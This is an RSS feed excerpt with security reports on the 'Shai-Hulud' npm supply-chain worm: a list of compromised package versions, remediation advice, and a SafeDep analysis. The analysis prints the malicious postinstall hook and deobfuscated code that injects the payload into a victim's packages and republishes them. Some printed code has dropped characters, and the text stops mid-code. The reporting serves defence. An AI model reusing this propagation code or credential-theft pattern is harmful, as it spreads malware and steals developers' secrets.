<td>@nstudio/nativescript-loading-indicator</td> <td>5.0.1, 5.0.2, 5.0.3, 5.0.4</td> </tr> <tr> <td>@nstudio/ui-collectionview</td> <td>5.1.11, 5.1.12, 5.1.13, 5.1.14</td> </tr> <tr> <td>@nstudio/web</td> <td>20.0.4</td> </tr> <tr> <td>@nstudio/web-angular</td> <td>20.0.4</td> </tr> <tr> <td>@nstudio/xplat</td> <td>20.0.5, 20.0.6, 20.0.7</td> </tr> <tr> <td>@nstudio/xplat-utils</td> <td>20.0.5, 20.0.6, 20.0.7</td> </tr> <tr> <td>@operato/board</td> <td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/data-grist</td> <td>9.0.29, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/graphql</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/headroom</td> <td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/help</td> <td>9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/i18n</td> <td>9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/input</td> <td>9.0.27, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/layout</td> <td>9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/popup</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/pull-to-refresh</td> <td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42</td> </tr> <tr> <td>@operato/shell</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39</td> </tr> <tr> <td>@operato/styles</td> <td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/utils</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@teselagen/bounce-loader</td> <td>0.3.16, 0.3.17</td> </tr> <tr> <td>@teselagen/liquibase-tools</td> <td>0.4.1</td> </tr> <tr> <td>@teselagen/range-utils</td> <td>0.3.14, 0.3.15</td> </tr> <tr> <td>@teselagen/react-list</td> <td>0.8.19, 0.8.20</td> </tr> <tr> <td>@teselagen/react-table</td> <td>6.10.19</td> </tr> <tr> <td>@thangved/callback-window</td> <td>1.1.4</td> </tr> <tr> <td>@things-factory/attachment-base</td> <td>9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50</td> </tr> <tr> <td>@things-factory/auth-base</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/email-base</td> <td>9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50, 9.0.51, 9.0.52, 9.0.53, 9.0.54</td> </tr> <tr> <td>@things-factory/env</td> <td>9.0.42, 9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/integration-base</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/integration-marketplace</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/shell</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@tnf-dev/api</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/core</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/js</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/mui</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/react</td> <td>1.0.8</td> </tr> <tr> <td>@ui-ux-gang/devextreme-angular-rpk</td> <td>24.1.7</td> </tr> <tr> <td>@yoobic/design-system</td> <td>6.5.17</td> </tr> <tr> <td>@yoobic/jpeg-camera-es6</td> <td>1.0.13</td> </tr> <tr> <td>@yoobic/yobi</td> <td>8.7.53</td> </tr> <tr> <td>airchief</td> <td>0.3.1</td> </tr> <tr> <td>airpilot</td> <td>0.8.8</td> </tr> <tr> <td>angulartics2</td> <td>14.1.1, 14.1.2</td> </tr> <tr> <td>browser-webdriver-downloader</td> <td>3.0.8</td> </tr> <tr> <td>capacitor-notificationhandler</td> <td>0.0.2, 0.0.3</td> </tr> <tr> <td>capacitor-plugin-healthapp</td> <td>0.0.2, 0.0.3</td> </tr> <tr> <td>capacitor-plugin-ihealth</td> <td>1.1.8, 1.1.9</td> </tr> <tr> <td>capacitor-plugin-vonage</td> <td>1.0.2, 1.0.3</td> </tr> <tr> <td>capacitorandroidpermissions</td> <td>0.0.4, 0.0.5</td> </tr> <tr> <td>config-cordova</td> <td>0.8.5</td> </tr> <tr> <td>cordova-plugin-voxeet2</td> <td>1.0.24</td> </tr> <tr> <td>cordova-voxeet</td> <td>1.0.32</td> </tr> <tr> <td>create-hest-app</td> <td>0.1.9</td> </tr> <tr> <td>db-evo</td> <td>1.1.4, 1.1.5</td> </tr> <tr> <td>devextreme-angular-rpk</td> <td>21.2.8</td> </tr> <tr> <td>ember-browser-services</td> <td>5.0.2, 5.0.3</td> </tr> <tr> <td>ember-headless-form</td> <td>1.1.2, 1.1.3</td> </tr> <tr> <td>ember-headless-form-yup</td> <td>1.0.1</td> </tr> <tr> <td>ember-headless-table</td> <td>2.1.5, 2.1.6</td> </tr> <tr> <td>ember-url-hash-polyfill</td> <td>1.0.12, 1.0.13</td> </tr> <tr> <td>ember-velcro</td> <td>2.2.1, 2.2.2</td> </tr> <tr> <td>encounter-playground</td> <td>0.0.2, 0.0.3, 0.0.4, 0.0.5</td> </tr> <tr> <td>eslint-config-crowdstrike</td> <td>11.0.2, 11.0.3</td> </tr> <tr> <td>eslint-config-crowdstrike-node</td> <td>4.0.3, 4.0.4</td> </tr> <tr> <td>eslint-config-teselagen</td> <td>6.1.7</td> </tr> <tr> <td>globalize-rpk</td> <td>1.7.4</td> </tr> <tr> <td>graphql-sequelize-teselagen</td> <td>5.3.8</td> </tr> <tr> <td>html-to-base64-image</td> <td>1.0.2</td> </tr> <tr> <td>json-rules-engine-simplified</td> <td>0.2.1</td> </tr> <tr> <td>jumpgate</td> <td>0.0.2</td> </tr> <tr> <td>koa2-swagger-ui</td> <td>5.11.1, 5.11.2</td> </tr> <tr> <td>mcfly-semantic-release</td> <td>1.3.1</td> </tr> <tr> <td>mcp-knowledge-base</td> <td>0.0.2</td> </tr> <tr> <td>mcp-knowledge-graph</td> <td>1.2.1</td> </tr> <tr> <td>mobioffice-cli</td> <td>1.0.3</td> </tr> <tr> <td>monorepo-next</td> <td>13.0.1, 13.0.2</td> </tr> <tr> <td>mstate-angular</td> <td>0.4.4</td> </tr> <tr> <td>mstate-cli</td> <td>0.4.7</td> </tr> <tr> <td>mstate-dev-react</td> <td>1.1.1</td> </tr> <tr> <td>mstate-react</td> <td>1.6.5</td> </tr> <tr> <td>ng2-file-upload</td> <td>7.0.2, 7.0.3, 8.0.1, 8.0.2, 8.0.3, 9.0.1</td> </tr> <tr> <td>ngx-bootstrap</td> <td>18.1.4, 19.0.3, 19.0.4, 20.0.3, 20.0.4, 20.0.5</td> </tr> <tr> <td>ngx-color</td> <td>10.0.1, 10.0.2</td> </tr> <tr> <td>ngx-toastr</td> <td>19.0.1, 19.0.2</td> </tr> <tr> <td>ngx-trend</td> <td>8.0.1</td> </tr> <tr> <td>ngx-ws</td> <td>1.1.5, 1.1.6</td> </tr> <tr> <td>oradm-to-gql</td> <td>35.0.14, 35.0.15</td> </tr> <tr> <td>oradm-to-sqlz</td> <td>1.1.2</td> </tr> <tr> <td>ove-auto-annotate</td> <td>0.0.9</td> </tr> <tr> <td>pm2-gelf-json</td> <td>1.0.4, 1.0.5</td> </tr> <tr> <td>printjs-rpk</td> <td>1.6.1</td> </tr> <tr> <td>react-complaint-image</td> <td>0.0.32</td> </tr> <tr> <td>react-jsonschema-form-conditionals</td> <td>0.3.18</td> </tr> <tr> <td>remark-preset-lint-crowdstrike</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>rxnt-authentication</td> <td>0.0.3, 0.0.4, 0.0.5, 0.0.6</td> </tr> <tr> <td>rxnt-healthchecks-nestjs</td> <td>1.0.2, 1.0.3, 1.0.4, 1.0.5</td> </tr> <tr> <td>rxnt-kue</td> <td>1.0.4, 1.0.5, 1.0.6, 1.0.7</td> </tr> <tr> <td>swc-plugin-component-annotate</td> <td>1.9.1, 1.9.2</td> </tr> <tr> <td>tbssnch</td> <td>1.0.2</td> </tr> <tr> <td>teselagen-interval-tree</td> <td>1.1.2</td> </tr> <tr> <td>tg-client-query-builder</td> <td>2.14.4, 2.14.5</td> </tr> <tr> <td>tg-redbird</td> <td>1.3.1</td> </tr> <tr> <td>tg-seq-gen</td> <td>1.0.9, 1.0.10</td> </tr> <tr> <td>thangved-react-grid</td> <td>1.0.3</td> </tr> <tr> <td>ts-gaussian</td> <td>3.0.5, 3.0.6</td> </tr> <tr> <td>ts-imports</td> <td>1.0.1, 1.0.2</td> </tr> <tr> <td>tvi-cli</td> <td>0.1.5</td> </tr> <tr> <td>ve-bamreader</td> <td>0.2.6</td> </tr> <tr> <td>ve-editor</td> <td>1.0.1</td> </tr> <tr> <td>verror-extra</td> <td>6.0.1</td> </tr> <tr> <td>voip-callkit</td> <td>1.0.2, 1.0.3</td> </tr> <tr> <td>wdio-web-reporter</td> <td>0.1.3</td> </tr> <tr> <td>yargs-help-output</td> <td>5.0.3</td> </tr> <tr> <td>yoo-styles</td> <td>6.0.326</td> </tr> </tbody> </table></div><p>&zwj;<strong>Story developing&hellip;</strong></p><h2>Remediation Advice</h2><ul><li>Check the versions you are using</li><li>Clean your npm cache</li><li>Reinstall all packages in your repository</li><li>Make sure you use a package lock file, and use pinned versions</li></ul><p><strong>How to tell if you are affected using Aikido:</strong></p><p>If you are an Aikido user, check your central feed and filter on malware issues. The vulnerability will be surfaced as a 100/100 critical issue in the feed. <strong>Tip</strong>: Aikido rescans your repos nightly, though we recommend triggering a full rescan as well.</p><p>If you are not yet an Aikido user, <a href="https://app.aikido.dev/login?_gl=1*5vc6kw*_gcl_aw*R0NMLjE3NTE2MjY3NDMuQ2owS0NRanc5NTNEQmhDeUFSSXNBTmhJWm9iTlE1dF9QaXZmbjVGb0pGeGRDV0VYMU1sN3lzUzhCSURXeFhIb0tzV0lYM09Gc1ZuNTRtUWFBczZlRUFMd193Y0I.*_gcl_au*MTkyMTk3MTY1NS4xNzUyNDgyNzky*FPAU*MTE5NDkwODkyOS4xNzUyNDgyNzU0">set up an account</a> and connect your repos. Our proprietary malware coverage is included in the free plan (no credit card required).</p><p><strong>For future protection</strong>, considering using <a href="https://www.npmjs.com/package/@aikidosec/safe-chain">Aikido SafeChain&nbsp;(open source)</a>, a secure wrapper for npm, npx, yarn... Safechain sits in your current workflows, it works by intercepting npm, npx, yarn, pnpm and pnpx commands and verifying the packages for malware before install against <a href="https://intel.aikido.dev/?tab=malware"><strong>Aikido Intel - Open Sources Threat Intelligence.</strong></a> Stop threats before they hit your machine.</p><p>&zwj;</p><p>&zwj;</p></div><div><div><p>Charlie Eriksen is a Security Researcher at Aikido Security, with extensive experience across IT security - including in product and leadership roles. He is the founder of jswzl and he previously worked at Secure Code Warrior as a security researcher and co-founded Adversary.</p></div></div></div><div><div><div><h2>AutoTriage Integration in IDE</h2><p>Aikido's IDE plugin can detect vulnerable code, and AutoTriage can help you ro priotiize what to fix</p></div></div><div><div><h2>Aikido for Students and Educators</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div><div><div><h2>Free hands-on security labs for your students</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div></div><div><div><h2>Get secure for free</h2><p>Secure your code, cloud, and runtime in one central system.<br>Find and fix vulnerabilities <span>fast</span> automatically.</p><p>No credit card required |Scan results in 32secs.</p></div></div></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c938f5a9eb08d6b0b63db8_Dune_2021-Sandworm.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c93b06a4b5417495f6a444_3c0aef4a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c93b06a4b5417495f6a447_8e743ed6.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/67ea6658517bb9c783e617e2_65871099f04b9ebb3d253537_359431729_10161266676199604_6750652865330630761_n.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6836b17027f911d14ce42ba7_arrow%20right.svg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825fdbd77201ff82b42eaac_Frame%201321315277%20(1).avif"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825d8f68e45d9a5bf7a4beb_b1dbddf2b778530e6f5ace222c099514_random-cta-background.avif"></p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 19:09:03 +0530</pubDate></item><item><link>https://safedep.io/npm-supply-chain-attack-targeting-maintainers/</link><title>Self-replicating worm like behaviour in latest npm Supply Chain Attack (safedep.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/</guid><comments>https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 41 min | <a href='https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>We are investigating another npm supply chain attack. However, this one seems to be particularly interesting. Malicious payload include:</p><ul><li>Credential stealing using <code>trufflehog</code> scanning entire filesystem</li><li>Exposing GitHub private repositories</li><li>AWS credentials stealing</li></ul><p>Most surprisingly, we are observing self-replicating worm like behaviour if npm tokens are found from <code>.npmrc</code> and the affected user have packages published to npm.</p><p>Exposed GitHub repositories can be <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories&amp;s=updated&amp;o=desc">searched here</a>. Take immediate action if you are impacted.</p><p>Full technical details <a href="https://safedep.io/npm-supply-chain-attack-targeting-maintainers/">here</a>.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://safedep.io/images/npm-supply-chain-attack-ctrl-tinycolor-banner.png' /></section><section class='parsed-content'><div xmlns:xlink="http://www.w3.org/1999/xlink"><section><article><div><p><span> SafeDep Team </span><span>&bull;</span> <time>Sep 16, 2025 </time><span>&bull;</span> <span>10 min read</span></p></div><div><h2>TL;DR</h2><p>npm supply chain attacks continue. This time targeting <code>@ctrl/tinycolor</code> and multiple other npm packages with credential stealer malware. In this blog, we will analyze the attack and its impact on the npm ecosystem. We will also look at common attack patterns that are being used to target maintainers.</p><p>Lately we have observed multiple high-profile software supply chain attacks against the npm ecosystem:</p><ul><li><a href="https://safedep.io/multiple-npm-packages-compromised-billion-downloads">ansi-styles, debug, chalk and more npm packages compromised</a></li><li><a href="https://safedep.io/nx-build-system-compromise/">nx Build System Compromised</a></li><li><a href="https://github.com/duckdb/duckdb-node/security/advisories/GHSA-w62p-hx95-gf2c">DuckDB npm packages compromised</a></li><li><a href="https://safedep.io/eslint-config-prettier-major-npm-supply-chain-hack/">eslint-config-prettier compromised</a></li></ul><p>These attacks target packages collectively with over <em>2 BILLION</em> weekly downloads. While the payloads used in these attacks have questionable sophistication levels, the continued success of malicious actors in breaching highly popular open source packages exposes risks in the open source software supply chain, especially for software development teams shipping professional software.</p><p>There are, however, common patterns that are observed in these attacks:</p><ol><li>2FA phishing attacks against maintainers as we saw in the <a href="https://safedep.io/eslint-config-prettier-major-npm-supply-chain-hack/">eslint-config-prettier incident</a></li><li>Maintainers of dormant packages are being targeted as we saw in the <a href="https://safedep.io/multiple-npm-packages-compromised-billion-downloads">ansi-style incident</a> and today&rsquo;s incident as well.</li></ol><p>For example, <code>@ctrl/tinycolor</code> did not have a release since over a year.</p><h3>Summary of Malicious Payload</h3><p><strong>Credential Harvesting:</strong></p><ul><li>Generates GitHub authentication tokens using <code>gh auth token</code> command</li><li>Harvests AWS credentials from environment variables, configuration files, Web Identity Tokens, and EC2 Instance Metadata Service (IMDS)</li><li>Uses TruffleHog to scan the local filesystem for secrets and credentials</li><li>Exfiltrates all discovered credentials to an attacker-controlled <code>webhook.site</code> URL</li></ul><p><strong>Repository Compromise:</strong></p><ul><li>Injects malicious GitHub Action workflows into all repositories accessible to the compromised user</li><li>Copies private repositories and makes them public with the description <code>Shai-Hulud Migration</code></li><li>Removes <code>.github/workflows</code> directories during the migration process to avoid detection</li></ul><p><strong>Self-Propagating Worm Behavior:</strong></p><ul><li>Extracts npm authentication tokens from <code>.npmrc</code> files</li><li>Identifies npm packages where the compromised user has maintainer access</li><li>Downloads package tarballs, injects the malicious <code>bundle.js</code> payload, and adds postinstall scripts</li><li>Automatically publishes new malicious versions of packages to npm registry</li><li>Increments package version numbers to ensure the malicious versions are treated as updates</li></ul><h3>How SafeDep can help?</h3><h4>Protect GitHub Repositories</h4><p>To protect the developer community against malicious packages that are flagged by SafeDep, we built free to use <a href="https://github.com/apps/safedep">SafeDep GitHub App</a>. It can be installed with zero configuration and will scan every pull request for malicious packages.</p><h4>Protect Developer Environments</h4><p>SafeDep open source tools especially <a href="https://github.com/safedep/vet">vet</a> and <a href="https://github.com/safedep/pmg">pmg</a> can help protect developers from malicious packages and other open source software supply chain attacks.</p><h2>The Attack</h2><p>The following is the list of affected package versions as published by <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">Socket Security</a>:</p><h2>Technical Analysis</h2><p>We will use <a href="https://www.npmjs.com/package/@ctrl/deluge">@ctrl/<span>[email&nbsp;protected]</span></a> as the malicious sample for our analysis. SafeDep&rsquo;s automated malicious package analysis engine flagged this version based on <a href="https://platform.safedep.io/community/malysis/01K57G6DA5GGCTGNEWT159SX6D">post-install script and signature match</a>.</p><p>We compared version <code>7.2.0</code> and <code>7.2.2</code> to identify the malicious changes. The obvious difference was the size of the package.</p><div><figure><pre><code><div><p><span>&#10095; du -sh *</span></p></div><div><p><span>12K deluge-7.2.0.tgz</span></p></div><div><p><span>2.0M deluge-7.2.2.tgz</span></p></div></code></pre></figure></div><p>Subsequently, we looked at <code>package.json</code> changes and observed a newly introduced <code>postinstall</code> script in the malicious version.</p><div><figure><pre><code><div><p><span>&#10095;</span><span>diff</span><span>-u</span><span>package-7.2.0/package.json</span><span>package-7.2.2/package.json</span></p></div><div><p><span>---</span><span>package-7.2.0/package.json</span><span>1985-10-26</span><span>13:45:00</span></p></div><div><p><span>+++</span><span>package-7.2.2/package.json</span><span>2025-09-16</span><span>01:43:28</span></p></div><div><p><span>@@</span><span>-1,6</span><span>+1,6</span><span>@@</span></p></div><div><p><span>{</span></p></div><div><p><span>"name"</span><span>:</span><span>"@ctrl/deluge",</span></p></div><div><p><span>-</span><span>"version":</span><span>"7.2.0",</span></p></div><div><p><span>+</span><span>"version":</span><span>"7.2.2",</span></p></div><div><p><span>"description"</span><span>:</span><span>"TypeScript api wrapper for deluge using got",</span></p></div><div><div><p><span>"author"</span><span>:</span><span>"Scott Cooper &lt;<a href="https://safedep.io/cdn-cgi/l/email-protection">[email&nbsp;protected]</a>&gt;",</span></p></div></div><div><p><span>"license"</span><span>:</span><span>"MIT",</span></p></div><div><p><span>@@</span><span>-25,7</span><span>+25,8</span><span>@@</span></p></div><div><p><span>"build:docs"</span><span>:</span><span>"typedoc",</span></p></div><div><p><span>"test"</span><span>:</span><span>"vitest run",</span></p></div><div><p><span>"test:watch"</span><span>:</span><span>"vitest",</span></p></div><div><p><span>-</span><span>"test:ci":</span><span>"vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml"</span></p></div><div><p><span>+</span><span>"test:ci":</span><span>"vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml",</span></p></div><div><p><span>+</span><span>"postinstall":</span><span>"node bundle.js"</span></p></div><div><p><span>},</span></p></div><div><p><span>"dependencies"</span><span>:</span><span>{</span></p></div><div><p><span>"@ctrl/magnet-link"</span><span>:</span><span>"^4.0.2",</span></p></div><div><p><span>@@</span><span>-83,4</span><span>+84,4</span><span>@@</span></p></div><div><p><span>"importOrderSeparation"</span><span>:</span><span>true</span><span>,</span></p></div><div><p><span>"importOrderSortSpecifiers"</span><span>:</span><span>false</span></p></div><div><p><span>}</span></p></div><div><p><span>-}</span></p></div><div><p><span>+}</span></p></div></code></pre></figure></div><p>Looking at some of the strings in <code>bundle.js</code>, it appears to be packed with <a href="https://webpack.js.org/api/node/">webpack</a>.</p><div><figure><pre><code><div><p><span>/*! For license information please see bundle.js.LICENSE.txt */</span></p></div><div><p><span>import</span><span>{createRequire </span><span>as</span><span> __WEBPACK_EXTERNAL_createRequire}</span><span>from</span><span>"node:module"</span><span>;</span><span>var</span><span> __webpack_modules__</span><span>=</span><span>{</span><span>1</span><span>:(</span><span>t</span><span>,</span><span>r</span><span>,</span><span>n</span><span>)</span><span>=&gt;</span><span>{n.</span><span>r</span><span>(r),n.</span><span>d</span><span>(r,{</span><span>isRedirect</span><span>:()</span><span>=&gt;</span><span>isRedirect});</span><span>const</span><span>F</span><span>=new</span><span>Set</span><span>([</span><span>301</span><span>,</span><span>302</span><span>,</span><span>303</span><span>,</span><span>307</span></p></div><div><p><span>,</span><span>308</span><span>])</span></p></div></code></pre></figure></div><h3>Payload</h3><p>Observed malicious payload in <code>bundle.js</code>:</p><ul><li>Generates a GitHub auth token using <code>gh auth token</code> with the current user&rsquo;s credentials</li><li>Contains an embedded bash script that injects a malicious GitHub Action workflow into all repositories of the authenticated user</li><li>Contains an embedded bash script that copies private repositories using the compromised GitHub token and makes them public with the description <code>Shai-Hulud Migration</code></li><li>Uses <a href="https://github.com/trufflesecurity/trufflehog">Trufflehog</a> to mine secrets from the local filesystem and exfiltrate them to an attacker-controlled <code>webhook.site</code> URL</li><li>Harvests AWS credentials from environment variables, local configuration files, Web Identity Tokens, and the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html">IMDS</a> endpoint</li></ul><p><strong>Self-replicating worm like behavior</strong></p><p>The <code>bundle.js</code> payload has self-replicating worm-like behavior to infect <code>npm</code> packages that are accessible to the authenticated user. To achieve this, the payload does the following:</p><ul><li>Finds the infected user&rsquo;s npm token from the <code>.npmrc</code> file</li><li>Calls <code>https://registry.npmjs.org/-/whoami</code> to validate the token and retrieve the username</li><li>Searches for packages that are accessible to the authenticated user as a maintainer</li><li>Downloads the package tarball, injects the <code>bundle.js</code> payload, and adds a postinstall script to <code>package.json</code></li><li>Publishes the package to the authenticated user&rsquo;s npm registry using the <code>npm publish ...</code> command</li></ul><p>Example code:</p><div><figure><pre><code><div><p><span>async </span><span>searchPackages</span><span>(t, r </span><span>=</span><span>20</span><span>) {</span></p></div><div><p><span>const</span><span>n</span><span>=</span><span>`/-/v1/search?text=${</span><span>encodeURIComponent</span><span>(</span><span>t</span><span>)</span><span>}&amp;size=${</span><span>r</span><span>}`</span><span>,</span></p></div><div><p><span>F</span><span>=</span><span>`${</span><span>this</span><span>.</span><span>baseUrl</span><span>}${</span><span>n</span><span>}`</span><span>;</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span>await</span><span>fetch</span><span>(</span><span>F</span><span>, {</span></p></div><div><p><span>method: </span><span>"GET"</span><span>,</span></p></div><div><p><span>headers: </span><span>this</span><span>.</span><span>getHeaders</span><span>(</span><span>!</span><span>1</span><span>)</span></p></div><div><p><span>});</span></p></div><div><p><span>if</span><span> (</span><span>!</span><span>t.ok) </span><span>throw</span><span>new</span><span>Error</span><span>(</span><span>`HTTP ${</span><span>t</span><span>.</span><span>status</span><span>}: ${</span><span>t</span><span>.</span><span>statusText</span><span>}`</span><span>);</span></p></div><div><p><span>return</span><span> (</span><span>await</span><span> t.</span><span>json</span><span>()).objects </span><span>||</span><span> []</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>return</span><span> console.</span><span>error</span><span>(</span><span>"Error searching packages:"</span><span>, t), []</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div><p><strong>Update Package to inject bundle.js and modify package.json</strong></p><div><figure><pre><code><div><p><span>async </span><span>updatePackage</span><span>(t) {</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>const</span><span>ie</span><span>=</span><span>await</span><span>fetch</span><span>(t.tarballUrl, {</span></p></div><div><p><span>method: </span><span>"GET"</span><span>,</span></p></div><div><p><span>headers: {</span></p></div><div><p><span>"User-Agent"</span><span>: </span><span>this</span><span>.userAgent,</span></p></div><div><p><span>Accept: </span><span>"*/*"</span><span>,</span></p></div><div><p><span>"Accept-Encoding"</span><span>: </span><span>"gzip, deflate, br"</span></p></div><div><p><span>}</span></p></div><div><p><span>});</span></p></div><div><p><span>// [...]</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>await</span><span> re.promises.</span><span>writeFile</span><span>(ce, se), </span><span>await</span><span>te</span><span>(</span><span>`gzip -d -c ${</span><span>ce</span><span>} &gt; ${</span><span>le</span><span>}`</span><span>), </span><span>await</span><span>te</span><span>(</span><span>`tar -xf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/package.json`</span><span>);</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> ne.</span><span>join</span><span>(ae, </span><span>"package"</span><span>, </span><span>"package.json"</span><span>),</span></p></div><div><p><span>r</span><span>=</span><span>await</span><span> re.promises.</span><span>readFile</span><span>(t, </span><span>"utf-8"</span><span>),</span></p></div><div><p><span>n</span><span>=</span><span>JSON</span><span>.</span><span>parse</span><span>(r);</span></p></div><div><p><span>if</span><span> (n.version) {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> n.version.</span><span>split</span><span>(</span><span>"."</span><span>);</span></p></div><div><p><span>if</span><span> (</span><span>3</span><span>===</span><span> t.</span><span>length</span><span>) {</span></p></div><div><p><span>const</span><span>r</span><span>=</span><span>parseInt</span><span>(t[</span><span>]),</span></p></div><div><p><span>F</span><span>=</span><span>parseInt</span><span>(t[</span><span>1</span><span>]),</span></p></div><div><p><span>te</span><span>=</span><span>parseInt</span><span>(t[</span><span>2</span><span>]);</span></p></div><div><p><span>isNaN</span><span>(te) </span><span>||</span><span> (n.version </span><span>=</span><span>`${</span><span>r</span><span>}.${</span><span>F</span><span>}.${</span><span>te</span><span>+</span><span>1</span><span>}`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>n.scripts </span><span>||</span><span> (n.scripts </span><span>=</span><span> {}), n.scripts.postinstall </span><span>=</span><span>"node bundle.js"</span><span>, </span><span>await</span><span> re.promises.</span><span>writeFile</span><span>(t, </span><span>JSON</span><span>.</span><span>stringify</span><span>(n, </span><span>null</span><span>, </span><span>2</span><span>)), </span><span>await</span><span>te</span><span>(</span><span>`tar -uf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/package.json`</span><span>);</span></p></div><div><p><span>const</span><span>F</span><span>=</span><span> process.argv[</span><span>1</span><span>];</span></p></div><div><p><span>if</span><span> (</span><span>F</span><span>&amp;&amp;</span><span>await</span><span> re.promises.</span><span>access</span><span>(</span><span>F</span><span>).</span><span>then</span><span>(() </span><span>=&gt;</span><span>!</span><span>).</span><span>catch</span><span>(() </span><span>=&gt;</span><span>!</span><span>1</span><span>)) {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> ne.</span><span>join</span><span>(ae, </span><span>"package"</span><span>, </span><span>"bundle.js"</span><span>),</span></p></div><div><p><span>r</span><span>=</span><span>await</span><span> re.promises.</span><span>readFile</span><span>(</span><span>F</span><span>);</span></p></div><div><p><span>await</span><span> re.promises.</span><span>writeFile</span><span>(t, r), </span><span>await</span><span>te</span><span>(</span><span>`tar -uf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/bundle.js`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>await</span><span>te</span><span>(</span><span>`gzip -c ${</span><span>le</span><span>} &gt; ${</span><span>ue</span><span>}`</span><span>), </span><span>await</span><span>te</span><span>(</span><span>`npm publish ${</span><span>ue</span><span>}`</span><span>), </span><span>await</span><span> re.promises.</span><span>rm</span><span>(ae, {</span></p></div><div><p><span>recursive: </span><span>!</span><span>,</span></p></div><div><p><span>force: </span><span>!</span></p></div><div><p><span></span><span>})</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>// [...]</span></p></div><div><p><span>}</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>throw</span><span>new</span><span>Error</span><span>(</span><span>`Failed to update package: 